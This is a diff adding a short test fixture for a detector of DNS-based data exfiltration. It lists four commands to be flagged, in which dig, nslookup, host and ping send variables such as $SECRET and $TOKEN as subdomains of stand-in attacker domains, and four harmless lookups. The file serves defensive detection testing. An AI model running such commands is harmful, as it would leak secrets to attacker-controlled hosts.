@@ -1,0 +1,14 @@
+# EX-003: DNS-based data exfiltration
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+dig $DATA.evil.com
+nslookup $SECRET.attacker.io
+host $ENCODED.malicious.net
+ping $TOKEN.evil.org
+
+# === Cases that should NOT be detected ===
+dig example.com
+nslookup google.com
+host github.com
+ping localhost
